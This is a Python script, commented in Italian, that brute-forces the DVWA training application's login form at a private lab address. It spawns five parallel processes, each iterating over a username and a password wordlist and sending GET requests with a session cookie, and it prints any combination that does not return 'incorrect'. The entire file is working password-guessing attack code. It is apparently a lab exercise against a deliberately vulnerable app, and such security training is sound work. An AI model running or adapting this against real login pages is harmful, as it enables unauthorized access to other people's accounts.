import requests
import multiprocessing
import os
import datetime

#########################################
#	Funzione principale che		        #
#	estrae e prova le varie 	        #
# 	combinzaioni di autenticazione      #
#	pescando da 10 file di testo 	    #
#########################################

def Brute(userTxt, passTxt):
	rip= 0   # combinazioni provate da un singolo processo
	userFile = open(f'/home/kali/Desktop/{userTxt}')
	passFile = open(f'/home/kali/Desktop/{passTxt}')
	userList = userFile.readlines()
	passList = passFile.readlines()
	start_time = datetime.datetime.now() 
	
	for user in userList: 
		user = user.rstrip()
		for pas in passList:
			pas = pas.rstrip()
			rip += 1 #debug 
			payload = f"?username={user}&password={pas}&Login=Login"
			outReqest = requests.get(url + payload, cookies=cookies)
			
			if "incorrect" in outReqest.text:
				if rip%att == 0:
					print("Processo-->",os.getpid()) # funzione di debug che ottiene il numero identificativo del processo in corso
					print("Combinazioni provate-->",rip)
					currTime = datetime.datetime.now()    # tempo corrente
					elapTime = currTime - start_time  # calcolo del tempo trascorso
					minutes, seconds = divmod(elapTime.seconds, 60)
					print(f"Tempo impiegato-->{minutes},{seconds}\n")
			else: 
				print("Combinazione corretta--> ",user ," " ,pas)

###########
# 	      #
#  MAIN   #
#	      #
###########

sessId = input("Inserisci ID sessione-->")

secFunc = ""
auxSec = input("Inserisci il livello di sicurezza: \n(A)-low\n(B)-medium\n(C)-high\n")
if auxSec == 'A':secFunc = "low"
elif auxSec == 'B':secFunc = "medium"
else: secFunc = "high"

att = 0		
auxAtt = input("Resoconto stato processi ogni (default 500): \n(A)-10 tentativi\n(B)-500 tentativi\n(C)-1000 tentativi\n")
if auxAtt == 'A':att = 10
elif auxAtt == 'C':att = 1000
else: att = 500

url = "http://192.168.50.103/dvwa/vulnerabilities/brute/"

cookies = {
	   "PHPSESSID":str(sessId),
       "security" : secFunc
}

if __name__ == '__main__':              						# funzione che crea e accende 5 processi 
	t1 = multiprocessing.Process(target=Brute, args=('user1.txt','pass1.txt')) 	# diversi in parallelo mandando  	
	t1.start() 									# come parametro di funzione il nome del
	t2 = multiprocessing.Process(target=Brute, args=('user2.txt','pass2.txt')) 	# file contente i dati
	t2.start() 
	t3 = multiprocessing.Process(target=Brute, args=('user3.txt','pass3.txt')) 
	t3.start() 
	t4 = multiprocessing.Process(target=Brute, args=('user4.txt','pass4.txt')) 
	t4.start()
	t5 = multiprocessing.Process(target=Brute, args=('user5.txt','pass5.txt')) 
	t5.start()
	print("Processi avviati correttamente")